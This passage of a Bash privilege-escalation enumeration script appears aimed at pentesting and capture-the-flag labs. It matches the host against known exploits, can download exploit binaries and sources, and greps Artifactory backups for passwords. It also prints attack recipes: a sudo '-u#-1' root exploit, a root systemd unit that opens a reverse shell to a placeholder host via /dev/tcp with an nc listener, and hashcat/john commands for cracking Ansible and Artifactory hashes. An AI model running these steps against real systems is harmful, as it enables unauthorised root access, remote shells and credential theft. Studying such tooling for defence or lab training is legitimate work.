            cmd="${IN:4}"
            if eval "${cmd}"; 
            then
                return 0
            fi
        fi
        return 1
    }
    getKernelConfig() {
        if [ -f /proc/config.gz ] ; 
        then
            KCONFIG="zcat /proc/config.gz"
        elif [ -f /boot/config-`uname -r` ] ; 
        then
            KCONFIG="cat /boot/config-`uname -r`"
        elif [ -f "${KBUILD_OUTPUT:-/usr/src/linux}"/.config ] ; 
        then
            KCONFIG="cat ${KBUILD_OUTPUT:-/usr/src/linux}/.config"
        else
            KCONFIG=""
        fi
    }
    checksecMode() {
        MODE=0
    for FEATURE in "${FEATURES[@]}"; 
    do
        i=0
        while read -r line
        do
            arr[i]="$line"
            i=$((i + 1))
        done <<< "$FEATURE"
        NAME="${arr[0]}"
        PRE_NAME="${NAME:0:8}"
        NAME="${NAME:9}"
        if [ "${PRE_NAME}" = "section:" ]; 
        then
            MODE=$(($MODE + 1))
            echo
            echo -e "${NAME}${XX}"
            echo
            continue
        fi
        AVAILABLE="${arr[1]}" && AVAILABLE="${AVAILABLE:11}"
        ENABLE=$(echo "$FEATURE" | grep "enabled: " | awk -F'ed: ' '{print $2}')
        analysis_url=$(echo "$FEATURE" | grep "analysis-url: " | awk '{print $2}')
        IFS=',' read -r -a array <<< "$AVAILABLE"
        AVAILABLE_REQS_NUM=${#array[@]}
        AVAILABLE_PASSED_REQ=0
        CONFIG=""
        for REQ in "${array[@]}"; 
        do
            if [ -z "$CONFIG" ]; 
            then
                config=$(echo "$REQ" | grep "CONFIG_")
                [ -n "$config" ] && CONFIG="($(echo $REQ | cut -d'=' -f1))"
            fi
            if (checkRequirement "$REQ"); 
            then
                AVAILABLE_PASSED_REQ=$(($AVAILABLE_PASSED_REQ + 1))
            else
                break
            fi
        done
        ENABLE_PASSED_REQ=0
        ENABLE_REQS_NUM=0
        noSysctl=0
        if [ -n "$ENABLE" ]; 
        then
            IFS=',' read -r -a array <<< "$ENABLE"
            ENABLE_REQS_NUM=${#array[@]}
            for REQ in "${array[@]}";
            do
                cmdStdout=$(checkRequirement "$REQ")
                retVal=$?
                if [ $retVal -eq 0 ]; 
                then
                    ENABLE_PASSED_REQ=$(($ENABLE_PASSED_REQ + 1))
                elif [ $retVal -eq 2 ]; 
                then
                    noSysctl=1
                    break
                else
                    break
                fi
            done
        fi
        feature=$(echo "$FEATURE" | grep "feature: " | cut -d' ' -f 2-)
        if [ -n "$cmdStdout" ]; 
        then
            if [ "$cmdStdout" -eq 0 ]; 
            then
                state="[ ${RED}Set to $cmdStdout${XX} ]"
                cmdStdout=""
            else
                state="[ ${GREEN}Set to $cmdStdout${XX} ]"
                cmdStdout=""
            fi
        else
        unknown="[ ${GRAY}Unknown${XX}  ]"
        if [ $MODE -eq 3 ]; 
        then
            enabled="[ ${GREEN}Enabled${XX}   ]"
            disabled="[   ${GRAY}N/A${XX}    ]"
        elif [ $MODE -eq 4 ]; 
        then
        enabled="[ ${RED}Exposed${XX}  ]"
        disabled="[ ${GREEN}Locked${XX}   ]"
        else
            enabled="[ ${GREEN}Enabled${XX}  ]"
            disabled="[ ${RED}Disabled${XX} ]"
        fi
        if [ -z "$KCONFIG" -a "$ENABLE_REQS_NUM" = 0 ]; 
        then
            state=$unknown
        elif [ $AVAILABLE_PASSED_REQ -eq $AVAILABLE_REQS_NUM -a $ENABLE_PASSED_REQ -eq $ENABLE_REQS_NUM ]; 
        then
            state=$enabled
        else
            state=$disabled
        fi
        fi
        echo -e " $state $feature ${CONFIG}${XX}"
        [ -n "$analysis_url" ] && echo -e "              $analysis_url"
        echo
    done
    }
    displayExposure() {
        RANK=$1
        if [ "$RANK" -ge 6 ]; 
        then
            echo "highly probable"
        elif [ "$RANK" -ge 3 ]; 
        then
            echo "probable"
        else
            echo "less probable"
        fi
    }
    ARGS=$(getopt --options $SHORTOPTS  --longoptions $LONGOPTS -- "$@")
    [ $? != 0 ] && exitWithErrMsg "Aborting."

    eval set -- "$ARGS"
    while true; 
    do
        case "$1" in
            -u|--uname)
                shift
                UNAME_A="$1"
                opt_uname_string=true
                ;;
            -V|--version)
                version
                exit 0
                ;;
            -h|--help)
                usage 
                exit 0
                ;;
            -f|--full)
                opt_full=true
                ;;
            -g|--short)
                opt_summary=true
                ;;
            -b|--fetch-binaries)
                opt_fetch_bins=true
                ;;
            -s|--fetch-sources)
                opt_fetch_srcs=true
                ;;
            -k|--kernel)
                shift
                KERNEL="$1"
                opt_kernel_version=true
                ;;
            -d|--show-dos)
                opt_show_dos=true
                ;;
            -p|--pkglist-file)
                shift
                PKGLIST_FILE="$1"
                opt_pkglist_file=true
                ;;
            --cvelist-file)
                shift
                CVELIST_FILE="$1"
                opt_cvelist_file=true
                ;;
            --checksec)
                opt_checksec_mode=true
                ;;
            --kernelspace-only)
                opt_kernel_only=true
                ;;
            --userspace-only)
                opt_userspace_only=true
                ;;
            --skip-more-checks)
                opt_skip_more_checks=true
                ;;
            --skip-pkg-versions)
                opt_skip_pkg_versions=true
                ;;
            *)
                shift
                if [ "$#" != "0" ]; 
                then
                    exitWithErrMsg "Unknown option '$1'. Aborting."
                fi
                break
                ;;
        esac
        shift
    done
    if ((BASH_VERSINFO[0] < 4)); 
    then
        exitWithErrMsg "Script needs Bash in version 4.0 or newer. Aborting."
    fi
    [ "$opt_kernel_version" = "true" ] && [ $opt_uname_string = "true" ] && exitWithErrMsg "Switches -u|--uname and -k|--kernel are mutually exclusive. Aborting."
    [ "$opt_full" = "true" ] && [ $opt_summary = "true" ] && exitWithErrMsg "Switches -f|--full and -g|--short are mutually exclusive. Aborting."
    if [ "$opt_cvelist_file" = "true" ]; 
    then
        [ ! -e "$CVELIST_FILE" ] && exitWithErrMsg "Provided CVE list ${RED}	File does not exists. Aborting."
        [ "$opt_kernel_version" = "true" ] && exitWithErrMsg "Switches -k|--kernel and --cvelist-file are mutually exclusive. Aborting."
        [ "$opt_uname_string" = "true" ] && exitWithErrMsg "Switches -u|--uname and --cvelist-file are mutually exclusive. Aborting."
        [ "$opt_pkglist_file" = "true" ] && exitWithErrMsg "Switches -p|--pkglist-file and --cvelist-file are mutually exclusive. Aborting."
    fi
    if [ "$opt_checksec_mode" = "true" ]; 
    then
        [ "$opt_kernel_version" = "true" ] && exitWithErrMsg "Switches -k|--kernel and --checksec are mutually exclusive. Aborting."
        [ "$opt_uname_string" = "true" ] && exitWithErrMsg "Switches -u|--uname and --checksec are mutually exclusive. Aborting."
        [ "$opt_pkglist_file" = "true" ] && exitWithErrMsg "Switches -p|--pkglist-file and --checksec are mutually exclusive. Aborting."
    fi
    if [ "$opt_kernel_version" == "true" ]; 
    then
        [ -z "$KERNEL" ] && exitWithErrMsg "Unrecognized kernel version given. Aborting."
        ARCH=""
        OS=""
        opt_skip_more_checks=true
        getPkgList "" "$PKGLIST_FILE"
    elif [ "$opt_uname_string" == "true" ]; 
    then
        [ -z "$UNAME_A" ] && exitWithErrMsg "uname string empty. Aborting."
        parseUname "$UNAME_A"
        opt_skip_more_checks=true
        getPkgList "" "$PKGLIST_FILE"
    elif [ "$opt_cvelist_file" = "true" ]; 
    then
        [ "$opt_skip_more_checks" = "false" ] && getKernelConfig
    elif [ "$opt_checksec_mode" = "true" ]; 
    then
        opt_skip_more_checks=false
        getKernelConfig
        [ -z "$KCONFIG" ] && echo "WARNING. Kernel Config not found on the system results won't be complete."
        checksecMode
        exit 0
    else
        if [ "$opt_pkglist_file" == "false" ]; 
        then
            UNAME_A=$(uname -a)
            [ -z "$UNAME_A" ] && exitWithErrMsg "uname string empty. Aborting."
            parseUname "$UNAME_A"
            [ "$opt_skip_more_checks" = "false" ] && getKernelConfig
            [ -n "$OS" -a "$opt_skip_more_checks" = "false" ] && DISTRO=$(grep -s -E '^DISTRIB_RELEASE=|^VERSION_ID=' /etc/*-release | cut -d'=' -f2 | head -1 | tr -d '"')
            getPkgList "$OS" ""
        else
            KERNEL=""
            ARCH=""
            unset EXPLOITS
            declare -A EXPLOITS
            getPkgList "" "$PKGLIST_FILE"
            opt_skip_more_checks=true
        fi
    fi
    echo
    echo
    echo "${#EXPLOITS[@]} kernel space exploits"
    echo "${#EXPLOITS_USERSPACE[@]} user space exploits"
    echo
    echo -e "${RED}    ══{ Possible Exploits:${XX}"
    echo
    j=0
    for EXP in "${EXPLOITS[@]}" "${EXPLOITS_USERSPACE[@]}"; 
    do
        i=0
        while read -r line
        do
            arr[i]="$line"
            i=$((i + 1))
        done <<< "$EXP"
        NAME="${arr[0]}" && NAME="${NAME:6}"
        REQS="${arr[1]}" && REQS="${REQS:6}"
        TAGS="${arr[2]}" && TAGS="${TAGS:6}"
        RANK="${arr[3]}" && RANK="${RANK:6}"
        IFS=',' read -r -a array <<< "$REQS"
        REQS_NUM=${#array[@]}
        PASSED_REQ=0
        for REQ in "${array[@]}"; 
        do
            if (checkRequirement "$REQ" "${array[0]}"); 
            then
                PASSED_REQ=$(($PASSED_REQ + 1))
            else
                break
            fi
        done
        if [ $PASSED_REQ -eq $REQS_NUM ]; 
        then
            if [ "$opt_cvelist_file" = "true" ]; 
            then
                cve=$(echo "$NAME" | grep '.*\[.*\].*' | cut -d 'm' -f2 | cut -d ']' -f1 | tr -d '[' | tr "," "|")
                [ ! $(cat "$CVELIST_FILE" | grep -E "$cve") ] && continue
            fi
            tags=""
            if [ -n "$TAGS" -a -n "$OS" ]; 
            then
                IFS=',' read -r -a tags_array <<< "$TAGS"
                TAGS_NUM=${#tags_array[@]}
                [ "$(echo "${tags_array[@]}" | grep "$OS")" -a "$opt_uname_string" == "true" ] && RANK=$(($RANK + 1))

                for TAG in "${tags_array[@]}"; 
                do
                    tag_distro=$(echo "$TAG" | cut -d'=' -f1)
                    tag_distro_num_all=$(echo "$TAG" | cut -d'=' -f2)
                    tag_distro_num="${tag_distro_num_all%{*}"
                    if [ "$opt_uname_string" == "true" -o \( "$OS" == "$tag_distro" -a "$(echo "$DISTRO" | grep -E "$tag_distro_num")" \) ]; 
                    then
                        [ "$opt_uname_string" == "false" ] && RANK=$(($RANK + 2))
                        tag_pkg=$(echo "$tag_distro_num_all" | cut -d'{' -f 2 | tr -d '}' | cut -d':' -f 1)
                        tag_pkg_num=""
                        [ $(echo "$tag_distro_num_all" | grep '{') ] && tag_pkg_num=$(echo "$tag_distro_num_all" | cut -d'{' -f 2 | tr -d '}' | cut -d':' -f 2)
                        if [ -z "$tag_pkg_num" ]; 
                        then
                            [ "$opt_uname_string" == "false" ] && TAG="${YELLOW}[ ${TAG}  } ${XX}"
                        elif [ -n "$tag_pkg_num" -a "$tag_pkg" = "kernel" ]; 
                        then
                            if [ $(echo "$KERNEL_ALL" | grep -E "${tag_pkg_num}") ]; 
                            then
                                TAG="${YELLOW}[ ${TAG}  } ${XX}"
                                RANK=$(($RANK + 3))
                            else
                                [ "$opt_uname_string" == "false" ] && TAG="${YELLOW}[ $tag_distro=$tag_distro_num  } ${XX}{kernel:$tag_pkg_num}"
                            fi
                        elif [ -n "$tag_pkg_num" -a -n "$tag_pkg"  ]; 
                        then
                            TAG="${YELLOW}[ $tag_distro=$tag_distro_num  } ${XX}{$tag_pkg:$tag_pkg_num}"
                        fi

                    fi
                    tags="${tags}${TAG},"
                done
                [ -n "$tags" ] && tags="${tags%?}"
            else
                tags="$TAGS"
            fi
            EXP=$(echo "$EXP" | sed -e '/^Name:/d' -e '/^Reqs:/d' -e '/^Tags:/d')
            exploits_to_sort[j]="${RANK}Name: ${NAME}D3L1mReqs: ${REQS}D3L1mTags: ${tags}D3L1m$(echo "$EXP" | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/D3L1m/g')"
            ((j++))
        fi
    done
    IFS=$'\n'
    SORTED_EXPLOITS=($(sort -r <<<"${exploits_to_sort[*]}"))
    unset IFS
    for EXP_TEMP in "${SORTED_EXPLOITS[@]}"; 
    do
        RANK=$(echo "$EXP_TEMP" | awk -F'Name:' '{print $1}')
        EXP=$(echo "$EXP_TEMP" | sed 's/^[0-9]//g' | sed 's/D3L1m/\n/g')
        i=0
        while read -r line
        do
            arr[i]="$line"
            i=$((i + 1))
        done <<< "$EXP"
        NAME="${arr[0]}" && NAME="${NAME:6}"
        REQS="${arr[1]}" && REQS="${REQS:6}"
        TAGS="${arr[2]}" && tags="${TAGS:6}"
        EXPLOIT_DB=$(echo "$EXP" | grep "exploit-db: " | awk '{print $2}')
        analysis_url=$(echo "$EXP" | grep "analysis-url: " | awk '{print $2}')
        ext_url=$(echo "$EXP" | grep "ext-url: " | awk '{print $2}')
        comments=$(echo "$EXP" | grep "Comments: " | cut -d' ' -f 2-)
        reqs=$(echo "$EXP" | grep "Reqs: " | cut -d' ' -f 2)
        name=$(echo "$NAME" | cut -d' ' -f 2- | tr -d ' ()/')
        bin_url=$(echo "$EXP" | grep "bin-url: " | awk '{print $2}')
        src_url=$(echo "$EXP" | grep "src-url: " | awk '{print $2}')
        [ -z "$src_url" ] && [ -n "$EXPLOIT_DB" ] && src_url="https://www.exploit-db.com/download/$EXPLOIT_DB"
        [ -z "$src_url" ] && [ -z "$bin_url" ] && exitWithErrMsg "'src-url' / 'bin-url' / 'exploit-db' entries are all empty for '$NAME' exploit - fix that. Aborting."
        if [ -n "$analysis_url" ]; 
        then
            details="$analysis_url"
        elif $(echo "$src_url" | grep -q 'www.exploit-db.com'); 
        then
            details="https://www.exploit-db.com/exploits/$EXPLOIT_DB/"
        elif [[ "$src_url" =~ ^.*tgz|tar.gz|zip$ && -n "$EXPLOIT_DB" ]]; 
        then
            details="https://www.exploit-db.com/exploits/$EXPLOIT_DB/"
        else
            details="$src_url"
        fi
        dos=$(echo "$EXP" | grep -o -i "(dos")
        [ "$opt_show_dos" == "false" ] && [ -n "$dos" ] && continue
        if [ $opt_fetch_bins = "true" ]; 
        then
            for i in $(echo "$EXP" | grep "bin-url: " | awk '{print $2}'); 
            do
                [ -f "${name}_$(basename $i)" ] && rm -f "${name}_$(basename $i)"
                wget -q -k "$i" -O "${name}_$(basename $i)"
            done
        fi
        if [ $opt_fetch_srcs = "true" ]; 
        then
            [ -f "${name}_$(basename $src_url)" ] && rm -f "${name}_$(basename $src_url)"
            wget -q -k "$src_url" -O "${name}_$(basename $src_url)" &
        fi
        if [ "$opt_summary" = "true" ]; 
        then
        [ -z "$tags" ] && tags="-"
        echo -e "$NAME || $tags || $src_url"
        continue
        fi
        echo -e "[+] $NAME"
        echo -e "\n   Details: $details"
            echo -e "   Exposure: $(displayExposure $RANK)"
            [ -n "$tags" ] && echo -e "   Tags: $tags"
            echo -e "   Download URL: $src_url"
            [ -n "$ext_url" ] && echo -e "   ext-url: $ext_url"
            [ -n "$comments" ] && echo -e "   Comments: $comments"
            if [ "$opt_full" = "true" ]; 
            then
                [ -n "$reqs" ] && echo -e "   Requirements: $reqs"
                [ -n "$EXPLOIT_DB" ] && echo -e "   exploit-db: $EXPLOIT_DB"
                author=$(echo "$EXP" | grep "author: " | cut -d' ' -f 2-)
                [ -n "$author" ] && echo -e "   author: $author"
            fi
            echo
    done
echo -e "\n${BLUE}╔═════{ System Release:${XX}"
    cat /etc/*-release 2>/dev/null
echo -e "\n${BLUE}╔═════{ lsb Release:${XX}"
    lsb_release
echo -e "\n${BLUE}╔═════{ Host name:${XX}"
    hostnamectl 2>/dev/null
echo -e "\n${BLUE}╔═════{ System Version:${XX}"
    cat /proc/version
echo -e "\n${BLUE}╔═════{ Is sudo version vulnerable?${XX}"
    sudo -V | grep version
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the sudo version ${RED}<= v1.28${XX}, it is exploitable.                                                                    ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
        echo -e "\t║    sudo -u#-1 /bin/bash                                                                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Available shells:${XX}"
    cat /etc/shells 2>/dev/null
echo -e "\n${BLUE}╔═════{ Bash version:${XX}"
    bash --version | grep version 2>/dev/null
echo -e "\n${BLUE}╔═════{ Check Bash Shellshock Vulnerability:${XX}"
    env x='() { :;}; echo Bash is vulnerable' bash -c 'echo Bash is not vulnerable'
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Other test:                                                                                                         ║"
        echo -e "\t║    https://serverfault.com/questions/631257/how-to-test-if-my-server-is-vulnerable-to-the-shellshock-bug           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ User Environment:${XX}"
    env | grep -w 'LOGNAME\|HOME\|PATH\|SHELL\|PWD\|USER' --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If you have write permissions on any folder inside the PATH variable you may be able to hijack some libraries or    ║"
        echo -e "\t║binaries. Read more:                                                                                                ║"
        echo -e "\t║    https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/                                  ║"
        echo -e "\t║    https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-pwnlab-init/                   ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Lists block devices (hardrives, memory cards, etc):${XX}"
    lsblk -a
echo -e "\n${BLUE}╔═════{ Lists USB devices:${XX}"
    lsusb 2>/dev/null
echo -e "\n${BLUE}╔═════{ Information about SATA Devices for /dev/sda1:${XX}"
    hdparm /dev/sda1 2>/dev/null
echo -e "\n${BLUE}╔═════{ Linux File System Information:${XX}"
    fdisk -l 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Run fdisk -l to list the hosts disks. Then do the following:                                                        ║"
        echo -e "\t║    mkdir /mnt/own                                                                                                  ║"
        echo -e "\t║    mount /dev/sda1 /mnt/own                                                                                        ║"
        echo -e "\t║    cd /mnt/own                                                                                                     ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ List of running services:${XX}"
    service --status-all
echo -e "\n${BLUE}╔═════{ File-systems mounted:${XX}"
    df -h 2>/dev/null
echo -e "\n${BLUE}╔═════{ Unmounted file-systems:${XX}"
    cat /etc/fstab
echo -e "\n${BLUE}╔═════{ ASLR Settings:${XX}"
    cat /proc/sys/kernel/randomize_va_space
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Valid Settings:                                                                               ║"
        echo -e "\t║    0 = Disablabed                                                                            ║"
        echo -e "\t║    1 = Conservative Randomization                                                            ║"
        echo -e "\t║    2 = Full Randomization                                                                    ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ ASLR Address Space:${XX}"
    ldd /bin/bash
echo -e "\n${BLUE}╔═════{ SELinux status:${XX}"
    if [ -f /etc/selinux ]; 
        then
            echo -e "\n${BLUE}    ══{ SELinuxfs mount:${XX}"
            ls -l /sys/fs/selinux
            echo -e "\n${BLUE}    ══{ Status:${XX}"
            sestatus 2>/dev/null
            echo -e "\n${BLUE}    ══{ Version:${XX}"
            sestatus -v 2>/dev/null
            echo -e "\n${BLUE}    ══{ Root Directory:${XX}"
            ls -l /etc/selinux 2>/dev/null
            echo -e "\n${BLUE}    ══{ Default Setup:${XX}"
            cat /etc/sestatus.conf 2>/dev/null
            echo -e "\n${BLUE}    ══{ Boolean Values:${XX}"
            sestatus -b | more 2>/dev/null
                echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║What is SELinux?                                                                              ║"
                echo -e "\t║Security-Enhanced Linux (SELinux) is a security architecture for Linux® systems that allows   ║"
                echo -e "\t║administrators to have more control over who can access the system. It was originally         ║"
                echo -e "\t║developed by the United States National Security Agency (NSA) as a series of patches to the   ║"
                echo -e "\t║Linux kernel using Linux Security Modules(LSM).                                               ║"
                echo -e "\t║Read more:                                                                                    ║"
                echo -e "\t║    https://www.redhat.com/en/topics/linux/what-is-selinux                                    ║"
                echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	SELinux does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Abusing systemctl:${XX}"
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Create NewRCE.service and write:                                                              ║"
        echo -e "\t║    [Unit]                                                                                    ║"
        echo -e "\t║    Description=rooooot                                                                       ║"
        echo -e "\t║    [Service]                                                                                 ║"
        echo -e "\t║    Type=simple                                                                               ║"
        echo -e "\t║    User=root                                                                                 ║"
        echo -e "\t║    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/a.a.a.a/80 0>&1'                              ║"
        echo -e "\t║    [Install]                                                                                 ║"
        echo -e "\t║    wantedBy=multi-user.target                                                                ║"
        echo -e "\t║Open listener on your machine                                                                 ║"
        echo -e "\t║    nc -nlvp 80                                                                               ║"
        echo -e "\t║On Victim Machine:                                                                            ║"
        echo -e "\t║    systemctl enable /tmp/NewRCE.service                                                      ║"
        echo -e "\t║    systemctl start NewRCE                                                                    ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Total number of installed packages:${XX}"
    apt list --installed | wc -l 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║You can display all installed packages by doing:                                                                    ║"
        echo -e "\t║    apt list --installed                                                                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Is Ansible Installed on the system:${XX}"
    if [ -d /etc/ansible/ ]; 
        then
                echo -e "\t Yes"
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Ansible is an infrastructure configuration engine that enables IT personnel to dynamically and automatically        ║"
                echo -e "\t║configure IT infrastructure and computing resources. It works through a “push” model where the Ansible controller   ║"
                echo -e "\t║connects to registered “nodes” and runs “modules” on them.                                                          ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
            echo -e "\n${BLUE}    ══{ Version:${XX}"
                ansible --version | grep "version\|config\|configured\|ansible\|executable" 2>/dev/null
            echo -e "\n${BLUE}    ══{ File List:${XX}"
                ls -la /etc/ansible/ 2>/dev/null
            echo -e "\n${BLUE}    ══{ Host File:${XX}"
                cat /etc/ansible/hosts 2>/dev/null
            echo -e "\n${BLUE}    ══{ Related Usernames:${XX}"
                cat /etc/passwd | grep ansible 2>/dev/null
            echo -e "\n${BLUE}    ══{ Ansible-related log messages:${XX}"
                cat /var/log/syslog | grep "ansible\|password" 2>/dev/null
            echo -e "\n${BLUE}    ══{ Ansible Playbooks files:${XX}"
            if [ -d "/opt/playbooks/" ]
                then
                    ls -la /opt/playbooks/ 2>/dev/null
                else
                    echo -e "  ${RED}Playbooks does not exist${XX}"
            fi
            echo -e "\n${BLUE}    ══{ Ansible .yaml files:${XX}"
                find / -name *.yaml -type f 2>/dev/null
            echo -e "\n${BLUE}    ══{ Ansible .yaml files:${XX}"
                find / -name *.yml -type f 2>/dev/null
            echo -e "\n${BLUE}    ══{ Crack Ansible Hash:${XX}"
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Put the hash in ansible.yml file                                                                                    ║"
                echo -e "\t║    python3 /usr/share/john/ansible2john.py ./ansible.yml                                                           ║"
                echo -e "\t║Copy and Past the text to ansible.txt file                                                                          ║"
                echo -e "\t║    hashcat ansible.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt                                  ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	Ansible does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Is Artifactory Installed on the system:${XX}"
    if [ -d /opt/jfrog/ ]; 
        then
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Artifactory  is a “binary repository manager” that stores software packages and other binaries.                     ║"
                echo -e "\t║    https://jfrog.com/artifactory/                                                                                  ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
            echo -e "\n${BLUE}    ══{ Artifactory Files:${XX}"
                ls -la /opt/jfrog/ 2>/dev/null
            echo -e "\n${BLUE}    ══{ Artifactory Database Backups:${XX}"
                ls -la /opt/jfrog/artifactory/var/backup/access 2>/dev/null
            echo -e "\n${BLUE}    ══{ Artifactory Database Backups Passwords:${XX}"
                cat /opt/jfrog/artifactory/var/backup/access/*.json | grep password 2>/dev/null
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Past the hash in artifactory.txt                                                                                    ║"
                echo -e "\t║    john artifactory.txt --wordlist=/usr/share/wordlists/rockyou.txt                                                ║"
                echo -e "\t║Use the username and password to login to the web portal on poer 8082                                               ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
                echo -e "${RED}	Artifactory does not exist${XX}"
    fi
    echo -e "\n${BLUE}╔═════{ Others:${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║You can display all installed packages by doing:                                                                    ║"
        echo -e "\t║    apt list --installed                                                                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n\n${RED}\t\tEnumeration on progress ╔══════════════════.................(20%).....................................${XX}\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ══════════════════════════════════════════[ System Date/Time ]══════════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
sleep 2
echo -e "\n${BLUE}╔═════{ System Up Time:${XX}"
    uptime | sed -E 's/^[^,]*up *//; s/, *[[:digit:]]* users.*//; s/min/minutes/; s/([[:digit:]]+):0?([[:digit:]]+)/\1 hours, \2 minutes/'
echo -e "\n${BLUE}╔═════{ System Date:${XX}"
    date 2>/dev/null
echo -e "\n${BLUE}╔═════{ CPU Information:${XX}"
    lscpu 2>/dev/null
echo -e "\n${BLUE}╔═════{ System Timer List:${XX}"
    systemctl list-timers --all 2>/dev/null ## & sleep 2 ; kill $!
echo -e "\n${BLUE}╔═════{ backuperer.timer:${XX}"
    systemctl list-timers --all | grep backuperer.timer 2>/dev/null ## & sleep 2 ; kill $!
echo -e "\n${BLUE}    ══{ backuperer.timer location:${XX}"
        locate backupere.timer
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html                                                              ║"
        echo -e "\t║https://steflan-security.com/hack-the-box-tartarsauce-walkthrough/                                                  ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ════════════════════════════════════════════[ System SUID ]═════════════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}    ══{ What is SUID/SGID?${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║SUID (Set User ID) & SGIDs (Set Group ID) executables are those that execute with the permission of the owner (SUID)║"
        echo -e "\t║or group (SGID). You can identify SUID and SGIDs by a representative 's' in the execute permission field the file:  ║"
        echo -e "\t║-rwsr-sr-x can often be exploit to gain root privilege.                                                             ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Find capability files:${XX}"
    getcap -r / 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Capability files are different from system to another system. Googling them my revile a way of how to exploit them. ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Capability with setui+ep:${XX}"
    getcap -r / 2>/dev/null | grep cap_setuid+ep
echo -e "\n${BLUE}╔═════{ Built-in Binaries:${XX}"
		echo -e "\t/usr/sbin/pppd                    |  /usr/sbin/exim4"
		echo -e "\t/usr/bin/ntfs-3g                  |  /usr/bin/chsh"
		echo -e "\t/usr/bin/su                       |  /usr/bin/chfn"
		echo -e "\t/usr/bin/mount                    |  /usr/bin/sudo"
		echo -e "\t/usr/bin/umount                   |  /usr/bin/pkexec"
		echo -e "\t/usr/bin/passwd                   |  /usr/bin/newgrp"
		echo -e "\t/usr/bin/gpasswd                  |  /usr/bin/fusermount"
		echo -e "\t/usr/sbin/mount.nfs               |  /usr/sbin/mount.cifs"
		echo -e "\t/usr/lib/xorg/Xorg.wrap           |  /usr/lib/openssh/ssh-keysign"
		echo -e "\t/usr/lib/chromium/chrome-sandbox  |  /usr/libexec/polkit-agent-helper-1"
		echo -e "\t/usr/bin/vmware-user-suid-wrapper |  /usr/lib/dbus-1.0/dbus-daemon-launch-helper"
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Most linux system have these Binaries, and they are built-in, no escalation   ║"
        echo -e "\t║is done by them unless file permission has been change.                       ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════╝"
